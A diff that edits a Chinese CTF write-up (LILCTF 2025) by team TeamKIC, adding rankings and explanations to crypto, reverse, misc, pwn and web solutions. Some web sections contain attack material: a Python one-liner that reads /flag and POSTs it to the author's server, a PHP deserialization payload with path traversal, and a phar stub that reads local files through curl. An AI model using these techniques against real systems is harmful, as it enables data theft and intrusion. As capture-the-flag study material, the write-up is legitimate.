@@ -10,7 +10,7 @@
 ## \[misc\] 是谁没有阅读参赛须知？
 解题者：KLEk
 
-提交时间：2025-08-15 12:34:08 (UTC+8)
+提交时间：2025-08-15 12:34:08 (UTC+8) → #378 in 618 solves
 
 完全没什么可说的，我只是做了“是谁没有阅读参赛须知”这么一道题。甚至某种意义上我还是拖后腿的那位。
 
@@ -22,7 +22,7 @@ flag就在题干那里，我看见了就复制、点提交，这有什么可说�
 ## \[crypto\] ez_math
 解题者：Ishisashi
 
-提交时间：2025-08-15 15:19:09 (UTC+8)
+提交时间：2025-08-15 15:19:09 (UTC+8) → #252 in 353 solves
 
 令 $A=\left\[\begin{matrix}v\_{11}&v\_{12}\cr v\_{21}&v\_{22}\end{matrix}\right\]$，则：
 
@@ -73,7 +73,7 @@ LILCTF{It_w4s_the_be5t_of_times_1t_wa5_the_w0rst_of_t1me5}
 ## \[crypto\] mid_math
 解题者：Ishisashi
 
-提交时间：2025-08-15 16:28:32 (UTC+8)
+提交时间：2025-08-15 16:28:32 (UTC+8) → #61 in 202 solves
 
 这次可是五阶方阵，不能再爆算了。
 
@@ -126,7 +126,7 @@ LILCTF{Are_y0u_5till_4wake_que5t1on_m4ker!}
 ## \[web\] ez_bottle
 解题者：RenzukaCtone
 
-提交时间：2025-08-15 16:50:38 (UTC+8)
+提交时间：2025-08-15 16:50:38 (UTC+8) → #102 in 206 solves
 
 分析 .py。POST /upload 上传 ZIP 文件，远程端会将其解压至以生成的 MD5 命名的目录内。
 
@@ -145,7 +145,7 @@ LILCTF{Are_y0u_5till_4wake_que5t1on_m4ker!}
 ## \[misc\] v我50(R)MB
 解题者：RenzukaCtone
 
-提交时间：2025-08-15 17:09:07 (UTC+8)
+提交时间：2025-08-15 17:09:07 (UTC+8) → #17 in 84 solves
 
 访问靶机，F12，Chrome 上是可以显示一部分图像的。
 
@@ -182,7 +182,7 @@ sock.close()
 ## \[reverse\] 1'M no7 A rO6oT
 解题者：Ishisashi
 
-提交时间：2025-08-15 19:14:11 (UTC+8)
+提交时间：2025-08-15 19:14:11 (UTC+8) → #28 in 102 solves
 
 我愿称此题为俄罗斯套娃（
 
@@ -301,7 +301,7 @@ LILCTF{BE_VIGlLAN7_a6@lN$7_ph15HING}
 ## \[crypto\] Linear
 解题者：Ishisashi
 
-提交时间：2025-08-15 21:02:20 (UTC+8)
+提交时间：2025-08-15 21:02:20 (UTC+8) → #45 in 87 solves
 
 强的不是我，是 Mathematica（
 ```Python
@@ -337,10 +337,16 @@ LILCTF{2d36efef-9ee5-4dc9-ba7e-179b219837d0}
 ### Omake
 ![](img/cd3ed38874ec2040fc3cd6728ab21b09.png)
 
+这是我第一次用 pwntools，所以都不知道有 `interactive()` 这么个东西。
+
+照着 [4qwerty7 的过往 WP](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/players_writeup/1721) 写代码，所以变量名跟着用了「rr」——到底为甚么会双写呢？
+
+_优质解答：我不知道_
+
 ## \[web\] Ekko_note
 解题者：RenzukaCtone
 
-提交时间：2025-08-15 23:57:32 (UTC+8)
+提交时间：2025-08-15 23:57:32 (UTC+8) → #70 in 136 solves
 
 分析 .py。目标很明确，要任意执行命令，需要改掉时间 API 让时间到 2066 年之后，只有 admin 能改这个 API。
 
@@ -364,21 +370,25 @@ flash(f'密码恢复token已经发送，请检查你的邮箱', 'info')
 
 很难不注意到这里。那应该是要从这个 UUID v8 入手。装了 python 3.14 rc2 来测试数值，每次的结果都不一样。
 
-啊，那肯定和那个 random.seed() 有关啦。在靶机上随便注册一个账户后就能收到 SERVER_START_TIME。
+啊，那肯定和那个 random.seed() 有关啦。在靶机上随便注册一个账户后就能收到服务器每秒发送的时间数据(JSON)，里面就有 SERVER_START_TIME。在本地生成 UUID 时将此值作为 seed，再按照原本逻辑生成 UUID 就好了。
 
-在恢复 admin 密码页面用生成的 UUID 就可以改密码了。
+在恢复 admin 密码页面点击忘记密码，再填写生成的 UUID 就可以改密码了。
 
 ![](img/Snipaste_2025-08-15_22-29-29.png)
 
-靶机可以出网，拿自己的主机开了个 HTTP 服务，响应固定的 JSON 数据。
+靶机可以出网，于是拿自己的主机开了个 HTTP 服务，响应固定的 JSON 数据（date 字段值为 2066 年之后的日期）。
 
-然后开始任意执行命令拿 flag。执行命令是看不到输出的。最开始用 cat /flag > /www/index.php 再刷新页面，发现行不通，可能 bottle 提前把这些 templates 读到内存里了吧。
+然后就能任意执行命令拿 flag 啦！执行命令后在 web 上是看不到输出的。最开始用 `cat /flag > /www/dashboard.htm` (也试过 template 目录中的其它 .htm) 再刷新页面，发现行不通，可能 bottle 提前把这些 templates 读到内存里了吧。
 
-用了不少办法，感觉缺很多基本工具 (curl 等等)，最后想到靶机后端强大的 python。
+那不如再试试拿自己的主机接收输出吧，拿 curl 试了半天愣是什么都没接收到，可能比赛环境就没有 curl 这些基本工具。。
+
+最后想到靶机后端强大的 python：
 
 ```python
 python -c "import os;import http.client;conn = http.client.HTTPConnection('{我的服务器}');str=open('/flag', 'r', encoding='utf-8').read();conn.request('POST', '/upload', body=str)"
 ```
+
+在我的机器上执行 node.js 开启 HTTP 服务：
 
 ```JavaScript
 const express = require('express');
@@ -399,10 +409,12 @@ app.listen(20098, () => {
 
 ![](img/Snipaste_2025-08-15_23-57-25.png)
 
+第一次还把上面 init.sh 中的 FLAG 给交了（）
+
 ## \[crypto\] Space Travel
 解题者：Ishisashi
 
-提交时间：2025-08-16 12:48:51 (UTC+8)
+提交时间：2025-08-16 12:48:51 (UTC+8) → #20 in 39 solves
 
 不妨把 key 和 nonce 看成两个八百维 GF(2) 向量，位与结果中 1 的个数的奇偶也就成了两个向量的点积。于是得到了 600 个方程。
 
@@ -425,7 +437,18 @@ eqn = Join[Table[Dot[eqn[[n]][[1]], k] == eqn[[n]][[2]], {n, 1, Length[eqn]}], T
 (* 不知为何 Reduce 要比 Solve 快很多 *)
 Reduce[eqn, k, Modulus -> 2]
 ```
-虽然但是，还是有一个未知数没解出来。随机数生成的方程组秩是 600，从 vecs 的特征得到的方程组秩是 200，合起来却欠定了。不过试一试就可以得到正确的 key 了。
+虽然但是，还是有一个未知数没解出来。随机数生成的方程组秩是 600，从 vecs 的特征得到的方程组秩是 200，合起来却欠定了。
+
+![](img/QQ图片20250821134331.png)
+
+![](img/屏幕截图%202025-08-21%20011818.png)
+```
+Solution 1:
+11001010010011110001100000001001100001000001111101100111110110000100000011100101010110101111010001010111101101110010001010111010101001110100111111001100101101101100101110010111010000110110100011101110111110010000101011101000010011110111101101110101100001110100111100110100100100100110010011100000010011101110011001000110000000001111001110000110110001000011101101011111111001001110001000000110100000101000001101000111001111010101000110011101110010101010011100110110000000001111010100011110111101101101000100001000100011011011111100000110101101001010010100011010000100110000101110010001100100001111101011010111100110111100010001011100110011000001001101000010110010001110110110011111011011100100010000000110101101001100111011011011111001001001001101111011000110011001111010110110001001011010001100010100
+Solution 2:
+10001000111111010010110110011100101101011010111001001111001100100001101101000011100000100010000110001110010010111111100111100100001000011111000011111000011100110110000010110110001011000100010010000111100100101101111111110000101010110101110010010101010000111110000111011111100110101101101110001111110110100101111101000001110101110100111101111001001011000010011001101111110111011101110011000111010001010011110111011111000111110110011110011110010001110110101111111101000011100011101100001100111001100001010101111010101010111010110110011010011000110111000000110010110100010000111001001111111101010111110110110110110010011011101101001100111101100001110100110010110100111110010101010010100010101100010000001001001001011110010001011000110110001101001110101010000011011100111111110010110101100000101110111110
+```
+不过试一试就可以得到正确的 key 了。
 ```Python
 >>> from Crypto.Cipher import AES
 >>> from hashlib import md5
@@ -442,7 +465,7 @@ LILCTF{Un1qUe_s0luti0n_1N_sUbSp4C3!}
 ## \[misc\] 提前放出附件
 解题者：Ishisashi
 
-提交时间：2025-08-16 15:54:24 (UTC+8)
+提交时间：2025-08-16 15:54:24 (UTC+8) → #4 in 41 solves
 
 简直是 [GeekGame 3rd「基本功」](https://github.com/PKU-GeekGame/geekgame-3rd/blob/master/official_writeup/prob24-password)原题复现。
 
@@ -483,7 +506,7 @@ LILCTF{Z1pCRyp70_1s_n0t_5ecur3}
 ## \[pwn\] 签到
 解题者：Ishisashi
 
-提交时间：2025-08-16 16:42:36 (UTC+8)
+提交时间：2025-08-16 16:42:36 (UTC+8) → #185 in 203 solves
 
 很老掉牙的栈溢出，但我却是第一次做，找教程现学的。毕竟我没有特别训练过 CTF 技能，都是打完后就不管了。
 
@@ -573,10 +596,23 @@ LILCTF{03803481-0c2b-4d88-92fe-622984719f82}
 ```
 ……害我没去做真·签到题「是谁没有阅读参赛须知？」，好在昌九发现了那题。「难度：签到」倒是所言不虚，不过这是对有 pwn 基础的人而言的。
 
+### Omake
+这是我第一次学 pwn，所以一开始卡在了不少点。
+```Python
+rr.recvline()
+leak = rr.recvline()[:-1].ljust(8, b'\x00')
+```
+一开始只 `rr.recvline()` 了一次，发现后面算出的地址全是负数。打印 `leak` 发现，居然是零耶！
+```Python
+# 不弹栈就等着吃 Got EOF while reading in interactive 罢
+payload += pwn.p64(ret)
+```
+其实只要有问题就会报「Got EOF while reading in interactive」。但我完全不懂，直接丢去搜，反倒搜出了解决方案。
+
 ## \[crypto\] baaaaaag
 解题者：Ishisashi
 
-提交时间：2025-08-16 19:56:59 (UTC+8)
+提交时间：2025-08-16 19:56:59 (UTC+8) → #15 in 49 solves
 
 这是很典型的子集和问题。其密度大致是 72/90=0.8，可以采用 LLL-BKZ 算法。
 ```Python
@@ -622,7 +658,7 @@ LILCTF{M4ybe_7he_brut3_f0rce_1s_be5t}
 ## \[misc\] PNG Master
 解题者：Ishisashi
 
-提交时间：2025-08-16 20:44:26 (UTC+8)
+提交时间：2025-08-16 20:44:26 (UTC+8) → #64 in 133 solves
 
 IEND 后藏着一串 Base64：
 ```
@@ -700,7 +736,7 @@ zsteg 找的隐写的 flag2(base64) 和 zlib。后面就不会了，因为注意
 ## \[reverse\] Qt_Creator
 解题者：RenzukaCtone
 
-提交时间：2025-08-16 23:09:33 (UTC+8)
+提交时间：2025-08-16 23:09:33 (UTC+8) → #33 in 61 solves
 
 不会 pwn。直接把主程序的 HEX 拿去分析文本，找到这些：
 
@@ -708,7 +744,7 @@ zsteg 找的隐写的 flag2(base64) 和 zlib。后面就不会了，因为注意
 
 嗯神秘字符串呢，那就试着解解看吧。
 
-与 `LILCTF{` 对照着看，很快就能发现规律：密文每个字符从头开始加 1，下一个字符减 1，依次计算就能得到 flag。
+与 `LILCTF{` 对照着看，很快就能发现规律：密文从第一个字符开始加 1，下一个字符减 1，依次计算就能得到 flag。
 
 ```
 KJKDSGzR6`bsd5s1q`0t^wdsx`b1mw2oh4mu|
@@ -724,7 +760,7 @@ LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}
 ## \[reverse\] ARM ASM
 解题者：Ishisashi
 
-提交时间：2025-08-17 01:11:54 (UTC+8)
+提交时间：2025-08-17 01:11:54 (UTC+8) → #152 in 170 solves
 
 首先看一眼 MainActivity，发现了编码后的 Flag。
 ```
@@ -825,19 +861,21 @@ LILCTF{ez_arm_asm_meow_meow_meow_meow_meow_meow}
 ## \[web\] Your Uns3r
 解题者：RenzukaCtone
 
-提交时间：2025-08-17 04:08:04 (UTC+8)
+提交时间：2025-08-17 04:08:04 (UTC+8) → #36 in 75 solves
 
 题目给了源码，最下面的反序列函数可以用于创建对象。那我们要创建一个 admin 账户！
 
-"admin" 那里没有严格等于，真是太好啦，那我们就让创建的账户 admin 字段直接为 true(bool)。绕过 admin 那后面的 `Access":` 就不用管了。
+"admin" 那里没有严格等于，真是太好啦，那我们就让创建的账户 admin 字段直接为 true(bool)。绕过 admin 之后那后面的 `Access":` 字符串检测就不用管了。
 
-本地 PHP 里把对象构造好，调用 serialize() 之后 POST 过去。Payload:
+本地 PHP 里把对象构造好，调用 serialize() 之后 POST 过去。题目最后会拼接字符串 `prefix + "lilctf" + suffix` 并作为 include 的参数执行，那么最终路径构造为 `/lilctf/../flag`，即可顺利绕过。
+
+Payload:
 
 ```
 a:2:{i:0;O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:72:"O:6:"Access":2:{s:9:"\0*\0prefix";s:1:"/";s:9:"\0*\0suffix";s:8:"/../flag";}";}}
 ```
 
-这样就可以 include /lilctf/../flag 把 flag 显示出来。
+反序列化函数能自动处理这种多重双引号而无需转义，很欣慰。
 
 本地 PHP 8.4.11 测试时，直接传对象的序列化是可以按预期工作的，但到靶机上就不行。根据响应得知靶机 PHP 版本为 5.6.40。
 
@@ -896,7 +934,7 @@ req.end();
 ## \[reverse\] obfusheader.h
 解题者：Ishisashi
 
-提交时间：2025-08-17 20:20:10 (UTC+8)
+提交时间：2025-08-17 20:20:10 (UTC+8) → #48 in 50 solves
 
 随手输个短点的东西，发现 F3C4D9DF8EC9DCD0D593DDC696C3D7D69AC8D4D2CCCBE1C1 一步步变成了 596F757220666C616720697320746F6F2073686F72742100。
 
@@ -989,7 +1027,7 @@ LILCTF{Wh@T_lS_D@t@FLOW_c4N_1t_8E_E4t3N}
 ## \[misc\] 反馈调查
 解题者：Ishisashi
 
-提交时间：2025-08-17 20:27:19 (UTC+8)
+提交时间：2025-08-17 20:27:19 (UTC+8) → #70 in 115 solves
 ```
 本题的 flag 是：LILCTF{F4l1En_l3aV3s_Re7urN_T0_tHe1R_rO0tS}
 ```
@@ -998,12 +1036,14 @@ LILCTF{F4l1En_l3aV3s_Re7urN_T0_tHe1R_rO0tS}
 ```
 其实我不应该交这个 Flag 的。原本打算留给昌九提交，但脑子还是没有跟上手。十分后悔。
 
-## \[web\] php_jail_is_my_cry
+## \[web\] php_jail_is_my_cry (未解出)
 解题者：RenzukaCtone
 
 在本题上花了最多时间，最后也没有解出来。
 
 构造 phar 并进行 gzip 压缩可以绕过 php 检测，但怎么 jail 就不会了。
+
+构造自定义 STUB 的 phar：
 
 ```php
 <?php
@@ -1018,7 +1058,6 @@ $stub = <<<STUB
 <?php
     $ch = curl_init("file:///flag");
     curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
-    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $data = curl_exec($ch);
 	echo $data;
@@ -1031,9 +1070,28 @@ $phar->setStub($stub);
 echo "Built compressed: $pharFile\n";
 ```
 
+再用 gzip 压一次就可以绕过关键词检测了。
+
+看了 phpinfo 和 php.ini，禁用了大量基本函数和类，完全无从下手。
+
+把在 open_basename 内的 index.php 拿出来看看，说不定能从隐藏的那行代码中找到什么线索：
+
 ![](img/Snipaste_2025-08-17_22-03-06.png)
 
-好累啊唉唉唉
+curl 绕过 open_basename 吗，可我一执行 curl 相关函数就报错，明明在 index.php 里完全没问题。
+
+到这一步离比赛只剩一个小时了，没找到最后的突破口实在可惜。
+
+## Omake：队伍概况
+![](img/Snipaste_2025-08-26_19-42-40.png)
+
+![](img/Snipaste_2025-08-26_19-59-01.png)
+
+![](img/Snipaste_2025-08-26_19-59-12.png)
+
+![](img/Snipaste_2025-08-26_19-57-25.png)
+
+![](img/TeamKIC_个人积分图表_20250826T115643.svg)
 
 ## Omake：调查问卷
 ![](img/问卷%201.png)
@@ -1068,6 +1126,13 @@ echo "Built compressed: $pharFile\n";
 虽说以前有一起打过 Puzzle Hunt……这次三个人一起组队打 CTF 也实在是很难得的经历呢！既然如此，光听我自己的感想可不够。
 
 请欣赏属于整个 TeamKIC 的后日谈！
+
+_感谢 LilHouse 团队，以及阅读这篇 WP 的你……_
+
+## Omake：队员 RenzukaCtone 的一些感想
+好累啊唉唉唉
+
+![](img/Snipaste_2025-08-21_21-52-02.png)
 
 ## Omake：后日谈
 RenzukaCtone：这次 CTF，虽然一开始说是准备摆烂，最后为了解题连觉都没怎么睡（在家就可以凌晨解题了）。现在回想，只是自己转弯太慢，大部分时间都在进行无意义的尝试。
